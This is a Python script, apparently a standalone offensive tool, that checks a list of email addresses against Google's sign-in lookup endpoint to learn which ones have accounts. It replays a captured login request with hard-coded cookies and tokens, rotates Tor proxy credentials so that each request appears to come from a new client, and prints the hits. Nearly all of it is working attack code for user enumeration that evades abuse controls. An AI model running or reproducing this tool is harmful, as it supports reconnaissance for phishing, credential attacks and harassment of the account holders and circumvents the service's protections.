#!/usr/bin/env python3
# Coding: -*- UTF-8 -*-
# Author: Vitor Fernandes

import requests
import urllib3
import sys
from passlib import pwd
from colorama import Fore
from multiprocessing import Process

# Disable Warnings from Requests
urllib3.disable_warnings()

# Generate random credentials to use with Tor
def get_new_creds():
    key = pwd.genword(entropy=48, charset='hex')
    creds = key + ":" + "foobar"
    
    return creds

def gmail_enum(email):

    creds = get_new_creds()
    session = requests.session()

    # Set Tor as Proxy
    session.proxies = {'http': "socks5://{}@127.0.0.1:9050".format(creds), 'https': "socks5://{}@127.0.0.1:9050".format(creds)}

    headers = {
        'authority': 'accounts.google.com',
        'x-same-domain': '1',
        'sec-fetch-dest': 'empty',
        'google-accounts-xsrf': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.42 Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'accept': '*/*',
        'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=74076635-a8a4-4243-9d4e-1517c1e6b2e8,signin_mode=all_accounts,signout_mode=show_confirmation',
        'origin': 'https://accounts.google.com',
        'x-client-data': 'CIe2yQEIorbJAQiqncoBCMSrygEIy67KAQjPr8oBCJ2wygEIvbDKAQiWssoBCIq0ygEIhrXKAQiWtcoBCO21ygEI77XKAQiBtsoBCL22ygEIjbrKAQjmu8oBCP27ygEIvb3KARirpMoBGLi6ygEY+bvKAQ==',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'referer': 'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': '1P_JAR=2020-2-10-1; GAPS=1:6o14El3UVljAtwHZTACAQEW1LShMZg:vqTuc{}KmtYTLkf-F; NID=197=ithmFgKKrsDfX6uypAjA84pFQZ6BN6JIIB82pSVFwgxiHTX_7yc7iSDu9zFDlhggGe0npog9ju8wqt2M_OcrGEzrv8wv-KWR8Re5WsBVFCa5Gwc0WIhyad_4ajqfMBo3m1pFGIssx5cyBB_X9Cbpry201tDtDAOR_Jp16Mvhb2g'.format(creds),
        'dnt': '1',
    }

    params = (
        ('hl', 'en-GB'),
        ('_reqid', '78840'),
        ('rt', 'j'),
    )

    data = {
        '$continue': 'https://mail.google.com/mail/',
        'service': 'mail',
        'rip': '1',
        'f.req': '["{}","AEThLlwJg1WaJW_Z17qXzfIqDrti0JF0MkJh6CkRQlbypzjyZUcd2WxmzFfCCBgCtoOD3qHr991Y78mJZ_5JU3h6yHY3wgM0WfUbrprG0R-zoOWIifqFL2YgoE5qL2TRo3A3sJ76bblmk45G9xgjisCmCpF4W1jIrBAS1OLWDY_M_-L9rhMJujv8ZckPiAoSzigBuPVU6Max",[],null,"BR",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"74076635-a8a4-4243-9d4e-1517c1e6b2e8",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{}"]'.format(email, email),
        'bgRequest': '["identifier","\\u0021XV6lXn9CbduiYKDMRmRY9a8NW04BYZoCAAAAnlIAAABCmQPo-dIDd6alkWUMCiWkUJP4OBaofL8m5wja-OYqq0VEfmjqbPt97U2CPxifxzuuo6lysfAFj_RemiS1IBkM8enDhgq5YAEExvnsrjnZ98I2bqMb_O4Yu0EItR49lfVKSADTh6BikAnJPA05ShBxwh9aoeP2lB1kXdYN0E7oDMWgXzMlPbpk1rZ1FK88Z2JyUvjkQz5TZ_IVJCm7AaStaCfIRnjR7wYt8u6G37fIH_JkFQu3IcTXByzCEJ_EBiPr6P4wBEUrXaya437E6AUy6WfDvjl1q5zF39eTTLZEwszxJ3hM-xqKcv3-G4sZ9XGTkwWcf6-EJyGv3_qMr5AWkaGJopCuriUZ8AXXd1B1uiaBQ497_tp6N1Q_hyajAJQaEo-wXpcufwBGtnmzwbBQmz3MqbnnS596ZHf_YSeisfRrz3U3_rcYnGY5tV_kV-wJbWtpKaTH9NyErVgjX6lk41MdE8N-NxkNnsEMpJVXndlbE10tT4jmUstRIIPXVov8Onn4gKkG9Hd3itSHmYKynjzV0Re7G131KkAw_DDqi6cq5v583Jz1guTIi2j8ajp8JjBaTTudKjdJrjv8Ax3hNH-WxvnztirHAgQ_Rb-IBTlF613wjmPx0bUMeaaIRkvpUnHIOu5jrdBCHgsdgwiaAIQKXfIinfWLEsoyKGU5Xrb7Ts-bJkz29-0rOK7sDEIVPFRdO7j8cEKDiuCqW_XvkADMtCVU0bgj1zm1nMmSSNl-zc7dEHymsbY5lH_qPfeZpjvN2iduAjlyE466R5A47XAgqdjcuYVjGqc36k5-nE1ChSFGH5_gZLZzctFaYJWXxAgsN7Hg3x7wNpUoLJFurp0FT8rRoXOCyIVZtu0NGjP3RZcmqVyeTi8WOHnVJZjzhg4xTTaf3icugFgjsGx_kNlsx2rvD1Hi53rQhwZ711XgpDJ1ZwYpogFRN00UYAevt2KKMA6BGZIsjHOu9fC3nFMpEEEQmIQN6gGQSIocYRd-c8XslIC8hHuH3Kh68YLO1pmeupltUvPQFHrSt94SUCzQoxOWQrIqFCoOlPc5tX5m0e5uYwrUh8Isj5kAvD52CS4waV_UWYVO5Tio1JVH8XdRw4cJyR2EvtOTngEH-Fsj0DoBGo9GrEG5v8_Weg-4S7-Kdu4HaApIU06RO7FRdPyoW0LoTkmClag41nJcQXQa4KrOPZT2WBF6WW0gUhuvHA2kH7xxFzJR5pczCV7VT3FmEloNhAL48GUE9qlTufiGF-qY6m6G9WH01-32-br1SE9RaqXwjBhM0uhmB5I0LYxnUSF1DcxbeygPA_gmz8ndrE2ypx65u4FgZQ"]',
        'azt': 'AFoagUUzp1fJF7GgdB7_V5Mth3t4MODSpw:1581468769070',
        'cookiesDisabled': 'false',
        'deviceinfo': '[null,null,null,[],null,"BR",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"74076635-a8a4-4243-9d4e-1517c1e6b2e8",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]]]',
        'gmscoreversion': 'undefined',
        'checkConnection': 'youtube:607:0',
        'checkedDomains': 'youtube',
        'pstMsg': '1',
        '': ''
    }

    response = session.post('https://accounts.google.com/_/signin/sl/lookup', headers=headers, params=params, data=data, verify=False)

    if(email.lower() in response.text):
        print( Fore.GREEN + "[*] ==> {} have an Account at Google".format(email) + Fore.RESET)
    else:
        #pass
        """
        If you don't wanna to see the Not Found Emails
        Uncomment the line above
        And Comment the line bellow
        """
        print( Fore.RED + '[-] {} not found at Google'.format(email) + Fore.RESET)


def exploit(email):
    gmail_Process = Process(target=gmail_enum, args=(email,))
    gmail_Process.start()
    gmail_Process.join()


def main():
    usernames_file = sys.argv[1]

    with open(usernames_file) as usernames:
        for username in usernames.readlines():
            exploit(username.replace('\n', ''))

if(len(sys.argv) < 1):
    print('Usage: python script.py USERNAMES.TXT')

else:
    main()
